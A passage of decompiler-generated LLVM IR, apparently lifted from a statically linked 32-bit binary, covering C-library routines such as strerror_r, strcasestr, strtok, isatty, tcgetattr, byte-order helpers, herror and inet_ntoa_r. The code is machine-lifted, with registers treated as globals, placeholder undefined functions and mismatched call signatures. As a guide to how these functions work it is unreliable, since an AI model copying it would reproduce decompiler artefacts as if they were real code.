  uselistorder i32 %v0_8052a07, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v1_80529ed, { 1, 0 }
  uselistorder i8 %v2_80529e6, { 1, 0 }
  uselistorder i32 %v1_80529e5, { 0, 2, 1 }
  uselistorder i8 %v2_80529da, { 1, 0 }
  uselistorder i32 %v0_80529d956, { 1, 0 }
  uselistorder i32 %v1_80529c1, { 1, 0 }
  uselistorder i32 %v1_805299f, { 0, 2, 1 }
  uselistorder i8 %v2_8052993, { 1, 2, 0, 3, 4 }
  uselistorder i8* %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8052a43, { 6, 1, 3, 2, 0, 5, 4 }
  uselistorder label %dec_label_pc_8052a41, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8052a15, { 1, 0 }
  uselistorder label %dec_label_pc_80529f4, { 1, 0 }
  uselistorder label %dec_label_pc_80529d5, { 1, 0 }
  uselistorder label %dec_label_pc_80529e9.preheader, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp2, i32* @ebx, align 4
  %v3_8052a5d = call i32 @__xpg_strerror_r(i32 %tmp, i32 %tmp2, i32 %tmp1)
  %v0_8052a62 = load i32, i32* @ebx, align 4
  ret i32 %v0_8052a62
}

define i32 @__xpg_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-108 = alloca i8*, align 4
  store i32 %arg3, i32* @edi, align 4
  %v6_8052a7e = icmp ugt i32 %arg1, 124
  br i1 %v6_8052a7e, label %dec_label_pc_8052a9b, label %dec_label_pc_8052a80

dec_label_pc_8052a80:                             ; preds = %entry
  store i32 ptrtoint ([8 x i8]* @global_var_805d0c0.935 to i32), i32* @esi, align 4
  %v1_8052a904 = icmp eq i32 %arg1, 0
  %v1_8052a9211 = icmp eq i1 %v1_8052a904, false
  br i1 %v1_8052a9211, label %dec_label_pc_8052a89, label %dec_label_pc_8052a94

dec_label_pc_8052a89:                             ; preds = %dec_label_pc_8052a80, %dec_label_pc_8052a89
  %v0_8052a8c = phi i32 [ %v3_8052a8c, %dec_label_pc_8052a89 ], [ %arg1, %dec_label_pc_8052a80 ]
  %v0_8052a8f = phi i32 [ %v1_8052a8f, %dec_label_pc_8052a89 ], [ ptrtoint ([8 x i8]* @global_var_805d0c0.935 to i32), %dec_label_pc_8052a80 ]
  %v1_8052a89 = inttoptr i32 %v0_8052a8f to i8*
  %v2_8052a89 = load i8, i8* %v1_8052a89, align 1
  %v7_8052a89 = icmp eq i8 %v2_8052a89, 0
  %v2_8052a8c = zext i1 %v7_8052a89 to i32
  %v3_8052a8c = add i32 %v2_8052a8c, %v0_8052a8c
  %v16_8052a8c = icmp eq i32 %v3_8052a8c, 0
  %v1_8052a8f = add i32 %v0_8052a8f, 1
  store i32 %v1_8052a8f, i32* @esi, align 4
  %v1_8052a92 = icmp eq i1 %v16_8052a8c, false
  br i1 %v1_8052a92, label %dec_label_pc_8052a89, label %dec_label_pc_8052a94

dec_label_pc_8052a94:                             ; preds = %dec_label_pc_8052a89, %dec_label_pc_8052a80
  %v0_8052a96 = phi i32 [ ptrtoint ([8 x i8]* @global_var_805d0c0.935 to i32), %dec_label_pc_8052a80 ], [ %v1_8052a8f, %dec_label_pc_8052a89 ]
  store i32 0, i32* @ebp, align 4
  %v1_8052a96 = inttoptr i32 %v0_8052a96 to i8*
  %v2_8052a96 = load i8, i8* %v1_8052a96, align 1
  %v3_8052a96 = icmp eq i8 %v2_8052a96, 0
  %v1_8052a99 = icmp eq i1 %v3_8052a96, false
  br i1 %v1_8052a99, label %dec_label_pc_8052a94.dec_label_pc_8052aca_crit_edge, label %dec_label_pc_8052a9b

dec_label_pc_8052a94.dec_label_pc_8052aca_crit_edge: ; preds = %dec_label_pc_8052a94
  br label %dec_label_pc_8052aca

dec_label_pc_8052a9b:                             ; preds = %dec_label_pc_8052a94, %entry
  store i32 22, i32* @ebp, align 4
  %v1_8052aa3 = ashr i32 %arg1, 31
  store i8* null, i8** %stack_var_-108, align 4
  %v6_8052aaf = bitcast i32* %stack_var_-17 to i8*
  %v7_8052aaf = call i32 @_uintmaxtostr(i8* %v6_8052aaf, i32 %arg1, i32 %v1_8052aa3, i32 -10, i32 0)
  %v1_8052ab7 = add i32 %v7_8052aaf, -14
  store i32 %v1_8052ab7, i32* @esi, align 4
  %v5_8052ac1 = inttoptr i32 %v1_8052ab7 to i8*
  store i8* %v5_8052ac1, i8** %stack_var_-108, align 4
  %tmp44 = inttoptr i32 %v1_8052ab7 to i16*
  %v6_8052ac2 = call i32 @memcpy(i16* %tmp44, i32 ptrtoint ([15 x i8]* @global_var_805d096.936 to i32), i32 14)
  %v0_8052ad9.pre = load i32, i32* @edi, align 4
  %v0_8052adb.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8052aca

dec_label_pc_8052aca:                             ; preds = %dec_label_pc_8052a94.dec_label_pc_8052aca_crit_edge, %dec_label_pc_8052a9b
  %v0_8052adb = phi i32 [ %v0_8052a96, %dec_label_pc_8052a94.dec_label_pc_8052aca_crit_edge ], [ %v0_8052adb.pre, %dec_label_pc_8052a9b ]
  %v0_8052ad9 = phi i32 [ %arg3, %dec_label_pc_8052a94.dec_label_pc_8052aca_crit_edge ], [ %v0_8052ad9.pre, %dec_label_pc_8052a9b ]
  %v4_8052acc = icmp eq i32 %arg2, 0
  %v1_8052ad1 = icmp eq i1 %v4_8052acc, false
  %v2_8052ad9 = select i1 %v1_8052ad1, i32 %v0_8052ad9, i32 0
  store i32 %v2_8052ad9, i32* @edi, align 4
  %v5_8052adb = inttoptr i32 %v0_8052adb to i8*
  store i8* %v5_8052adb, i8** %stack_var_-108, align 4
  %v3_8052adc = call i32 @strlen(i8* %v5_8052adb)
  %v1_8052ae4 = add i32 %v3_8052adc, 1
  store i32 %v1_8052ae4, i32* %ebx.global-to-local, align 4
  %v1_8052ae7 = load i32, i32* @edi, align 4
  %tmp46 = icmp ugt i32 %v1_8052ae4, %v1_8052ae7
  br i1 %tmp46, label %dec_label_pc_8052aeb, label %dec_label_pc_8052af2

dec_label_pc_8052aeb:                             ; preds = %dec_label_pc_8052aca
  store i32 %v1_8052ae7, i32* %ebx.global-to-local, align 4
  store i32 34, i32* @ebp, align 4
  br label %dec_label_pc_8052af2

dec_label_pc_8052af2:                             ; preds = %dec_label_pc_8052aca, %dec_label_pc_8052aeb
  %v0_8052af7 = phi i32 [ %v1_8052ae4, %dec_label_pc_8052aca ], [ %v1_8052ae7, %dec_label_pc_8052aeb ]
  %v1_8052af2 = icmp eq i32 %v0_8052af7, 0
  br i1 %v1_8052af2, label %dec_label_pc_8052b0e, label %dec_label_pc_8052af6

dec_label_pc_8052af6:                             ; preds = %dec_label_pc_8052af2
  %v0_8052af8 = load i32, i32* @esi, align 4
  %v8_8052af9 = inttoptr i32 %arg2 to i8*
  store i8* %v8_8052af9, i8** %stack_var_-108, align 4
  %tmp45 = inttoptr i32 %arg2 to i16*
  %v6_8052afd = call i32 @memcpy(i16* %tmp45, i32 %v0_8052af8, i32 %v0_8052af7)
  %v1_8052b09 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052b09 = add i32 %arg2, -1
  %v3_8052b09 = add i32 %v2_8052b09, %v1_8052b09
  %v4_8052b09 = inttoptr i32 %v3_8052b09 to i8*
  store i8 0, i8* %v4_8052b09, align 1
  br label %dec_label_pc_8052b0e

dec_label_pc_8052b0e:                             ; preds = %dec_label_pc_8052af2, %dec_label_pc_8052af6
  %v0_8052b0e = load i32, i32* @ebp, align 4
  %v1_8052b0e = icmp eq i32 %v0_8052b0e, 0
  br i1 %v1_8052b0e, label %dec_label_pc_8052b19, label %dec_label_pc_8052b12

dec_label_pc_8052b12:                             ; preds = %dec_label_pc_8052b0e
  %v0_8052b12 = load i8*, i8** %stack_var_-108, align 4
  %v1_8052b12 = ptrtoint i8* %v0_8052b12 to i32
  %v2_8052b12 = call i32 @__errno_location(i32 %v1_8052b12)
  %v0_8052b17 = load i32, i32* @ebp, align 4
  %v2_8052b17 = inttoptr i32 %v2_8052b12 to i32*
  store i32 %v0_8052b17, i32* %v2_8052b17, align 4
  %v0_8052b1c.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_8052b19

dec_label_pc_8052b19:                             ; preds = %dec_label_pc_8052b0e, %dec_label_pc_8052b12
  %v0_8052b1c = phi i32 [ 0, %dec_label_pc_8052b0e ], [ %v0_8052b1c.pre, %dec_label_pc_8052b12 ]
  ret i32 %v0_8052b1c

; uselistorder directives
  uselistorder i32 %v1_8052ae7, { 1, 2, 0 }
  uselistorder i32 %v1_8052ae4, { 1, 0, 2 }
  uselistorder i32 %v1_8052ab7, { 1, 0, 2 }
  uselistorder i32 %v1_8052a8f, { 0, 2, 1 }
  uselistorder i32 %v3_8052a8c, { 1, 0 }
  uselistorder i8** %stack_var_-108, { 4, 3, 2, 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_805d0c0.935 to i32), { 1, 0, 2 }
  uselistorder i32 %arg2, { 0, 3, 2, 1 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_8052b19, { 1, 0 }
  uselistorder label %dec_label_pc_8052b0e, { 1, 0 }
  uselistorder label %dec_label_pc_8052af2, { 1, 0 }
  uselistorder label %dec_label_pc_8052aca, { 1, 0 }
  uselistorder label %dec_label_pc_8052a89, { 1, 0 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_8052b34 = inttoptr i32 %arg2 to i8*
  %v3_8052b34 = call i32 @memmove(i8* %v2_8052b34, i32 %arg1)
  ret i32 %v3_8052b34
}

define i32 @strcasestr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8052b3f = load i32, i32* @ebx, align 4
  %v4_8052b43 = ptrtoint i8* %arg1 to i32
  %v1_8052b4f18 = inttoptr i32 %arg2 to i8*
  %v2_8052b4f1931 = load i8, i8* %v1_8052b4f18, align 1
  %v4_8052b512335 = icmp eq i8 %v2_8052b4f1931, 0
  %v1_8052b532436 = icmp eq i1 %v4_8052b512335, false
  br i1 %v1_8052b532436, label %dec_label_pc_8052b59.lr.ph.lr.ph, label %dec_label_pc_8052b89

dec_label_pc_8052b59.lr.ph.lr.ph:                 ; preds = %entry
  %v3_8052b4f2032 = zext i8 %v2_8052b4f1931 to i32
  %v4_8052b4f.pre.pre = load i32, i32* @eax, align 4
  %v5_8052b4f2133 = and i32 %v4_8052b4f.pre.pre, -256
  %v6_8052b4f2234 = or i32 %v3_8052b4f2032, %v5_8052b4f2133
  %v4_8052b59.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8052b59.lr.ph

dec_label_pc_8052b59.lr.ph:                       ; preds = %dec_label_pc_8052b59.lr.ph.lr.ph, %dec_label_pc_8052b84
  %v4_8052b59.pre = phi i32 [ %v4_8052b59.pre.pre, %dec_label_pc_8052b59.lr.ph.lr.ph ], [ %v0_8052b66, %dec_label_pc_8052b84 ]
  %v6_8052b4f2239 = phi i32 [ %v6_8052b4f2234, %dec_label_pc_8052b59.lr.ph.lr.ph ], [ %v6_8052b4f22, %dec_label_pc_8052b84 ]
  %v2_8052b4f1938 = phi i8 [ %v2_8052b4f1931, %dec_label_pc_8052b59.lr.ph.lr.ph ], [ %v2_8052b4f19, %dec_label_pc_8052b84 ]
  %v0_8052b8437 = phi i32 [ %v4_8052b43, %dec_label_pc_8052b59.lr.ph.lr.ph ], [ %v1_8052b84, %dec_label_pc_8052b84 ]
  br label %dec_label_pc_8052b59

dec_label_pc_8052b59:                             ; preds = %dec_label_pc_8052b59.lr.ph, %dec_label_pc_8052b79
  %v4_8052b59 = phi i32 [ %v4_8052b59.pre, %dec_label_pc_8052b59.lr.ph ], [ %v4_8052b5944, %dec_label_pc_8052b79 ]
  %v6_8052b4f29 = phi i32 [ %v6_8052b4f2239, %dec_label_pc_8052b59.lr.ph ], [ %v6_8052b4f, %dec_label_pc_8052b79 ]
  %v2_8052b4f28 = phi i8 [ %v2_8052b4f1938, %dec_label_pc_8052b59.lr.ph ], [ %v2_8052b4f, %dec_label_pc_8052b79 ]
  %v1_8052b4f27 = phi i8* [ %v1_8052b4f18, %dec_label_pc_8052b59.lr.ph ], [ %v1_8052b4f, %dec_label_pc_8052b79 ]
  %v0_8052b7926 = phi i32 [ %arg2, %dec_label_pc_8052b59.lr.ph ], [ %v1_8052b79, %dec_label_pc_8052b79 ]
  %v0_8052b7a25 = phi i32 [ %v0_8052b8437, %dec_label_pc_8052b59.lr.ph ], [ %v1_8052b7a, %dec_label_pc_8052b79 ]
  %v1_8052b59 = inttoptr i32 %v0_8052b7a25 to i8*
  %v2_8052b59 = load i8, i8* %v1_8052b59, align 1
  %v3_8052b59 = zext i8 %v2_8052b59 to i32
  %v5_8052b59 = and i32 %v4_8052b59, -256
  %v6_8052b59 = or i32 %v5_8052b59, %v3_8052b59
  %v15_8052b5f = icmp eq i8 %v2_8052b4f28, %v2_8052b59
  br i1 %v15_8052b5f, label %dec_label_pc_8052b79, label %dec_label_pc_8052b63

dec_label_pc_8052b63:                             ; preds = %dec_label_pc_8052b59
  %v2_8052b63 = load i8, i8* %v1_8052b59, align 1
  %v3_8052b63 = zext i8 %v2_8052b63 to i32
  %v0_8052b66 = load i32, i32* bitcast (i32** @global_var_805f880.938 to i32*), align 128
  %v2_8052b6c = load i8, i8* %v1_8052b4f27, align 1
  %v3_8052b6c = zext i8 %v2_8052b6c to i32
  %v2_8052b6f = mul nuw nsw i32 %v3_8052b63, 2
  %v3_8052b6f = add i32 %v2_8052b6f, %v0_8052b66
  %v4_8052b6f = inttoptr i32 %v3_8052b6f to i16*
  %v5_8052b6f = load i16, i16* %v4_8052b6f, align 2
  %v6_8052b6f = zext i16 %v5_8052b6f to i32
  %v4_8052b73 = mul nuw nsw i32 %v3_8052b6c, 2
  %v5_8052b73 = add i32 %v4_8052b73, %v0_8052b66
  %v6_8052b73 = inttoptr i32 %v5_8052b73 to i16*
  %v7_8052b73 = load i16, i16* %v6_8052b73, align 2
  %v18_8052b73 = icmp eq i16 %v5_8052b6f, %v7_8052b73
  %v1_8052b77 = icmp eq i1 %v18_8052b73, false
  br i1 %v1_8052b77, label %dec_label_pc_8052b7d, label %dec_label_pc_8052b79

dec_label_pc_8052b79:                             ; preds = %dec_label_pc_8052b63, %dec_label_pc_8052b59
  %v4_8052b5944 = phi i32 [ %v0_8052b66, %dec_label_pc_8052b63 ], [ %v6_8052b59, %dec_label_pc_8052b59 ]
  %v4_8052b4f6 = phi i32 [ %v6_8052b6f, %dec_label_pc_8052b63 ], [ %v6_8052b4f29, %dec_label_pc_8052b59 ]
  %v1_8052b79 = add i32 %v0_8052b7926, 1
  %v1_8052b7a = add i32 %v0_8052b7a25, 1
  %v1_8052b4f = inttoptr i32 %v1_8052b79 to i8*
  %v2_8052b4f = load i8, i8* %v1_8052b4f, align 1
  %v3_8052b4f = zext i8 %v2_8052b4f to i32
  %v5_8052b4f = and i32 %v4_8052b4f6, -256
  %v6_8052b4f = or i32 %v3_8052b4f, %v5_8052b4f
  %v4_8052b51 = icmp eq i8 %v2_8052b4f, 0
  %v1_8052b53 = icmp eq i1 %v4_8052b51, false
  br i1 %v1_8052b53, label %dec_label_pc_8052b59, label %dec_label_pc_8052b89

dec_label_pc_8052b7d:                             ; preds = %dec_label_pc_8052b63
  %v4_8052b7d = icmp eq i8 %v2_8052b59, 0
  br i1 %v4_8052b7d, label %dec_label_pc_8052b87, label %dec_label_pc_8052b84

dec_label_pc_8052b84:                             ; preds = %dec_label_pc_8052b7d
  %v1_8052b84 = add i32 %v0_8052b8437, 1
  %v2_8052b4f19 = load i8, i8* %v1_8052b4f18, align 1
  %v3_8052b4f20 = zext i8 %v2_8052b4f19 to i32
  %v5_8052b4f21 = and i32 %v6_8052b6f, 65280
  %v6_8052b4f22 = or i32 %v3_8052b4f20, %v5_8052b4f21
  %v4_8052b5123 = icmp eq i8 %v2_8052b4f19, 0
  %v1_8052b5324 = icmp eq i1 %v4_8052b5123, false
  br i1 %v1_8052b5324, label %dec_label_pc_8052b59.lr.ph, label %dec_label_pc_8052b89

dec_label_pc_8052b87:                             ; preds = %dec_label_pc_8052b7d
  br label %dec_label_pc_8052b89

dec_label_pc_8052b89:                             ; preds = %dec_label_pc_8052b84, %entry, %dec_label_pc_8052b79, %dec_label_pc_8052b87
  %storemerge = phi i32 [ 0, %dec_label_pc_8052b87 ], [ %v4_8052b43, %entry ], [ %v1_8052b84, %dec_label_pc_8052b84 ], [ %v0_8052b8437, %dec_label_pc_8052b79 ]
  store i32 %v0_8052b3f, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_8052b4f19, { 1, 2, 0 }
  uselistorder i8 %v2_8052b4f, { 1, 2, 0 }
  uselistorder i8* %v1_8052b4f, { 1, 0 }
  uselistorder i32 %v0_8052b66, { 1, 2, 3, 0 }
  uselistorder i32 %v0_8052b7a25, { 1, 0 }
  uselistorder i8 %v2_8052b4f1931, { 0, 2, 1 }
  uselistorder i8* %v1_8052b4f18, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052b89, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8052b59, { 1, 0 }
  uselistorder label %dec_label_pc_8052b59.lr.ph, { 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_8052ba0 = inttoptr i32 %arg1 to i8*
  %v4_8052ba0 = call i32 @strtok_r(i8* %v3_8052ba0, i32 %arg2, i32 ptrtoint (i32* @global_var_8065900.939 to i32))
  ret i32 %v4_8052ba0
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-60 = alloca i32, align 4
  %v3_8052bb8 = call i32 @__GI_tcgetattr(i32 %arg1, i32* nonnull %stack_var_-60)
  %v1_8052bbd = icmp eq i32 %v3_8052bb8, 0
  %v1_8052bbf = zext i1 %v1_8052bbd to i32
  ret i32 %v1_8052bbf
}

define i32 @__GI_tcgetattr(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_3()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = ptrtoint i32* %arg2 to i32
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8052bcc = load i32, i32* @esi, align 4
  %v0_8052bcd = load i32, i32* @ebx, align 4
  store i32 %v0_8052bcd, i32* %stack_var_-8, align 4
  %v2_8052bd1 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_8052bd1, i32* %eax.global-to-local, align 4
  store i32 %tmp8, i32* @ebx, align 4
  %v3_8052be3 = call i32 @ioctl(i32 %arg1, i32 21505, i32 %v2_8052bd1)
  store i32 %v3_8052be3, i32* %eax.global-to-local, align 4
  store i32 %v3_8052be3, i32* @esi, align 4
  %v1_8052bed = icmp eq i32 %v3_8052be3, 0
  %v1_8052bef = icmp eq i1 %v1_8052bed, false
  br i1 %v1_8052bef, label %dec_label_pc_8052c34, label %dec_label_pc_8052bf1

dec_label_pc_8052bf1:                             ; preds = %entry
  %v3_8052bf1 = load i32, i32* %stack_var_-44, align 4
  %v1_8052bf5 = load i32, i32* @ebx, align 4
  %v2_8052bf5 = inttoptr i32 %v1_8052bf5 to i32*
  store i32 %v3_8052bf1, i32* %v2_8052bf5, align 4
  %v1_8052bfb = load i32, i32* @ebx, align 4
  %v2_8052bfb = add i32 %v1_8052bfb, 4
  %v3_8052bfb = inttoptr i32 %v2_8052bfb to i32*
  %v1_8052c02 = load i32, i32* @ebx, align 4
  %v2_8052c02 = add i32 %v1_8052c02, 8
  %v3_8052c02 = inttoptr i32 %v2_8052c02 to i32*
  store i32 %tmp3, i32* %eax.global-to-local, align 4
  %v1_8052c09 = load i32, i32* @ebx, align 4
  %v2_8052c09 = add i32 %v1_8052c09, 12
  %v3_8052c09 = inttoptr i32 %v2_8052c09 to i32*
  store i32 %tmp3, i32* %v3_8052c09, align 4
  %v4_8052c0c = zext i8 %tmp to i32
  %v5_8052c0c = load i32, i32* %eax.global-to-local, align 4
  %v6_8052c0c = and i32 %v5_8052c0c, -256
  %v7_8052c0c = or i32 %v6_8052c0c, %v4_8052c0c
  store i32 %v7_8052c0c, i32* %eax.global-to-local, align 4
  %v2_8052c10 = load i32, i32* @ebx, align 4
  %v3_8052c10 = add i32 %v2_8052c10, 16
  %v4_8052c10 = inttoptr i32 %v3_8052c10 to i8*
  store i8 %tmp, i8* %v4_8052c10, align 1
  %v0_8052c13 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052c16 = ptrtoint i32* %stack_var_-27 to i32
  %v0_8052c1b = load i32, i32* @ebx, align 4
  %v1_8052c1b = add i32 %v0_8052c1b, 17
  store i32 %v1_8052c1b, i32* %eax.global-to-local, align 4
  %v4_8052c1f = call i32 @__GI_mempcpy(i32 %v1_8052c1b, i32 %v2_8052c16, i32 19, i32 %v0_8052c13)
  store i32 %v4_8052c1f, i32* %eax.global-to-local, align 4
  %v3_8052c2c = inttoptr i32 %v4_8052c1f to i8*
  %v4_8052c2c = call i32 @__GI_memset(i8* %v3_8052c2c, i32 0, i32 13)
  store i32 %v4_8052c2c, i32* %eax.global-to-local, align 4
  %v0_8052c34.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8052c34

dec_label_pc_8052c34:                             ; preds = %entry, %dec_label_pc_8052bf1
  %v0_8052c34 = phi i32 [ %v3_8052be3, %entry ], [ %v0_8052c34.pre, %dec_label_pc_8052bf1 ]
  store i32 %v0_8052c34, i32* %eax.global-to-local, align 4
  %v2_8052c39 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8052c39, i32* @ebx, align 4
  store i32 %v0_8052bcc, i32* @esi, align 4
  ret i32 %v0_8052c34

; uselistorder directives
  uselistorder i32 %v0_8052c34, { 1, 0 }
  uselistorder i32 %v3_8052be3, { 0, 2, 1, 3 }
  uselistorder i32 %tmp3, { 1, 0 }
  uselistorder i8 %tmp, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8052c34, { 1, 0 }
}

define i32 @htons(i32 %arg1) local_unnamed_addr {
entry:
  %v1_8052c40 = trunc i32 %arg1 to i16
  %v2_8052c40 = call i16 @llvm.bswap.i16(i16 %v1_8052c40)
  %v3_8052c40 = zext i16 %v2_8052c40 to i32
  ret i32 %v3_8052c40
}

define i32 @htonl() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v1_8052c4c = call i32 @llvm.bswap.i32(i32 %tmp)
  ret i32 %v1_8052c4c
}

define i32 @ntohs(i32 %arg1) local_unnamed_addr {
entry:
  %v1_8052c53 = trunc i32 %arg1 to i16
  %v2_8052c53 = call i16 @llvm.bswap.i16(i16 %v1_8052c53)
  %v3_8052c53 = zext i16 %v2_8052c53 to i32
  ret i32 %v3_8052c53
}

define i32 @ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v1_8052c5f = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v1_8052c5f
}

define i32 @hstrerror(i32 %arg1) local_unnamed_addr {
entry:
  %v6_8052c70 = icmp ugt i32 %arg1, 4
  br i1 %v6_8052c70, label %dec_label_pc_8052c79, label %dec_label_pc_8052c72

dec_label_pc_8052c72:                             ; preds = %entry
  %v1_8052c72 = mul i32 %arg1, 4
  %v2_8052c72 = add i32 %v1_8052c72, ptrtoint ([5 x i8*]* @global_var_805dc88.946 to i32)
  %v3_8052c72 = inttoptr i32 %v2_8052c72 to i32*
  %v4_8052c72 = load i32, i32* %v3_8052c72, align 4
  br label %dec_label_pc_8052c79

dec_label_pc_8052c79:                             ; preds = %entry, %dec_label_pc_8052c72
  %v0_8052c79 = phi i32 [ ptrtoint ([15 x i8]* @global_var_805dc9c.940 to i32), %entry ], [ %v4_8052c72, %dec_label_pc_8052c72 ]
  ret i32 %v0_8052c79

; uselistorder directives
  uselistorder label %dec_label_pc_8052c79, { 1, 0 }
}

define i32 @__GI_herror(i8* %arg1) local_unnamed_addr {
entry:
  %v4_8052c7f = ptrtoint i8* %arg1 to i32
  store i32 %v4_8052c7f, i32* @ebx, align 4
  %v2_8052c83 = icmp eq i8* %arg1, null
  br i1 %v2_8052c83, label %dec_label_pc_8052c91, label %dec_label_pc_8052c87

dec_label_pc_8052c87:                             ; preds = %entry
  store i32 ptrtoint ([3 x i8]* @global_var_805dcab.947 to i32), i32* @esi, align 4
  %v3_8052c8c = load i8, i8* %arg1, align 1
  %v4_8052c8c = icmp eq i8 %v3_8052c8c, 0
  %v1_8052c8f = icmp eq i1 %v4_8052c8c, false
  br i1 %v1_8052c8f, label %dec_label_pc_8052c96, label %dec_label_pc_8052c91

dec_label_pc_8052c91:                             ; preds = %dec_label_pc_8052c87, %entry
  store i32 ptrtoint (i32* @global_var_805dcad.948 to i32), i32* @esi, align 4
  br label %dec_label_pc_8052c96

dec_label_pc_8052c96:                             ; preds = %dec_label_pc_8052c87, %dec_label_pc_8052c91
  %v0_8052c96 = call i32 @__GI___h_errno_location()
  store i32 ptrtoint ([15 x i8]* @global_var_805dc9c.940 to i32), i32* @edx, align 4
  %v1_8052ca0 = inttoptr i32 %v0_8052c96 to i32*
  %v2_8052ca0 = load i32, i32* %v1_8052ca0, align 4
  %v6_8052ca5 = icmp ugt i32 %v2_8052ca0, 4
  br i1 %v6_8052ca5, label %dec_label_pc_8052cae, label %dec_label_pc_8052ca7

dec_label_pc_8052ca7:                             ; preds = %dec_label_pc_8052c96
  %v1_8052ca7 = mul i32 %v2_8052ca0, 4
  %v2_8052ca7 = add i32 %v1_8052ca7, ptrtoint ([5 x i8*]* @global_var_805dc88.946 to i32)
  %v3_8052ca7 = inttoptr i32 %v2_8052ca7 to i32*
  %v4_8052ca7 = load i32, i32* %v3_8052ca7, align 4
  store i32 %v4_8052ca7, i32* @edx, align 4
  br label %dec_label_pc_8052cae

dec_label_pc_8052cae:                             ; preds = %dec_label_pc_8052c96, %dec_label_pc_8052ca7
  %v0_8052cb1 = phi i32 [ ptrtoint ([15 x i8]* @global_var_805dc9c.940 to i32), %dec_label_pc_8052c96 ], [ %v4_8052ca7, %dec_label_pc_8052ca7 ]
  %v0_8052cb2 = load i32, i32* @esi, align 4
  %v0_8052cb9 = load i32, i32* inttoptr (i32 134608432 to i32*), align 16
  %v9_8052cbf = call i32 @fprintf(i32 %v0_8052cb9, i32 ptrtoint ([8 x i8]* @global_var_805dc1a.949 to i32), i32 %v4_8052c7f, i32 %v0_8052cb2, i32 %v0_8052cb1)
  ret i32 %v9_8052cbf

; uselistorder directives
  uselistorder i32 ptrtoint ([15 x i8]* @global_var_805dc9c.940 to i32), { 0, 2, 1 }
  uselistorder i8* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8052cae, { 1, 0 }
  uselistorder label %dec_label_pc_8052c96, { 1, 0 }
}

define i32 @__GI_inet_ntoa_r(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8052ccc = load i32, i32* @edi, align 4
  %v0_8052ccd = load i32, i32* @esi, align 4
  %v0_8052cce = load i32, i32* @ebx, align 4
  store i32 %v0_8052cce, i32* %stack_var_-12, align 4
  store i32 0, i32* @edi, align 4
  %v1_8052cd9 = add i32 %arg2, 15
  store i32 %v1_8052cd9, i32* %ecx.global-to-local, align 4
  store i32 0, i32* @esi, align 4
  %v1_8052cde = call i32 @llvm.bswap.i32(i32 %arg1)
  %sext = mul i32 %v1_8052cde, 16777216
  %v1_8052ce0 = sdiv i32 %sext, 16777216
  store i32 %v1_8052ce0, i32* @ebx, align 4
  br label %dec_label_pc_8052ce4

dec_label_pc_8052ce4:                             ; preds = %entry, %dec_label_pc_8052d09
  %v0_8052ce717 = phi i32 [ %v1_8052ce0, %entry ], [ %v2_8052d09, %dec_label_pc_8052d09 ]
  %v0_8052d1416 = phi i32 [ %v1_8052cd9, %entry ], [ %v0_8052d0d, %dec_label_pc_8052d09 ]
  %v1_8052ce9 = urem i32 %v0_8052ce717, 256
  %v5_8052cf7 = inttoptr i32 %v0_8052d1416 to i8*
  %v6_8052cf7 = call i32 @_uintmaxtostr(i8* %v5_8052cf7, i32 %v1_8052ce9, i32 0, i32 -10, i32 0)
  %v0_8052cff = load i32, i32* @esi, align 4
  %v1_8052cff = icmp eq i32 %v0_8052cff, 0
  %v1_8052d01 = add i32 %v6_8052cf7, -1
  store i32 %v1_8052d01, i32* %ecx.global-to-local, align 4
  br i1 %v1_8052cff, label %dec_label_pc_8052d09, label %dec_label_pc_8052d06

dec_label_pc_8052d06:                             ; preds = %dec_label_pc_8052ce4
  %v1_8052d06 = inttoptr i32 %v0_8052cff to i8*
  store i8 46, i8* %v1_8052d06, align 1
  %v0_8052d0d.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8052d09

dec_label_pc_8052d09:                             ; preds = %dec_label_pc_8052ce4, %dec_label_pc_8052d06
